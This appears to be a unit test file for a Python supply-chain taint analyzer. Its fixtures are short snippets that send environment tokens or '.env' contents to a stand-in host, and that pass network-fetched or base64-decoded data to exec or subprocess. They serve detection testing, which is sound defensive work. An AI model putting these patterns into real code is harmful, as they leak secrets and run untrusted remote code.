from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from guardchain.loader import load_package
from guardchain.taint_analyzer import analyze_taint


class TaintAnalyzerTests(unittest.TestCase):
    def _rules_for(self, code: str) -> set[str]:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "pkg.py").write_text(code, encoding="utf-8")
            context = load_package(root)
            return {finding.rule_id for finding in analyze_taint(context)}

    def test_sensitive_to_network(self) -> None:
        rules = self._rules_for("import os, requests\nt = os.environ.get('TOKEN')\nrequests.post('http://example.invalid', data=t)\n")
        self.assertIn("T001", rules)

    def test_obfuscation_to_exec(self) -> None:
        rules = self._rules_for("import base64\np = base64.b64decode('eA==')\nexec(p)\n")
        self.assertIn("T004", rules)

    def test_network_to_subprocess(self) -> None:
        rules = self._rules_for("import requests, subprocess\ndata = requests.get('http://example.invalid').text\nsubprocess.run(data)\n")
        self.assertIn("T003", rules)

    def test_network_to_file_write_and_dynamic(self) -> None:
        rules = self._rules_for("import requests\ndata = requests.get('http://example.invalid').text\nopen('payload.txt', 'w').write(data)\nexec(data)\n")
        self.assertIn("T002", rules)
        self.assertIn("T006", rules)

    def test_assignment_and_wrapper_propagation(self) -> None:
        code = "import os, json, requests\na = os.environ.get('TOKEN')\nb = a\nc = str(b)\nd = json.dumps({'x': c})\nrequests.post('http://example.invalid', data=d)\n"
        self.assertIn("T001", self._rules_for(code))

    def test_local_secret_to_network(self) -> None:
        self.assertIn("T005", self._rules_for("import requests\ndata = open('.env').read()\nrequests.post('http://example.invalid', data=data)\n"))

    def test_non_tainted_network_call_does_not_trigger_t001(self) -> None:
        rules = self._rules_for("import requests\nrequests.post('http://example.invalid', data='hello')\n")
        self.assertNotIn("T001", rules)

    def test_interprocedural_return_to_network_sink(self) -> None:
        code = (
            "import os, requests\n"
            "def get_token():\n"
            "    return os.environ.get('TOKEN')\n"
            "def send_token():\n"
            "    token = get_token()\n"
            "    requests.post('http://example.invalid/collect', data=token)\n"
        )
        self.assertIn("T001", self._rules_for(code))

    def test_interprocedural_parameter_to_network_sink(self) -> None:
        code = (
            "import os, requests\n"
            "def send_token(token):\n"
            "    requests.post('http://example.invalid/collect', data=token)\n"
            "def main():\n"
            "    token = os.environ.get('TOKEN')\n"
            "    send_token(token)\n"
        )
        self.assertIn("T001", self._rules_for(code))


if __name__ == "__main__":
    unittest.main()
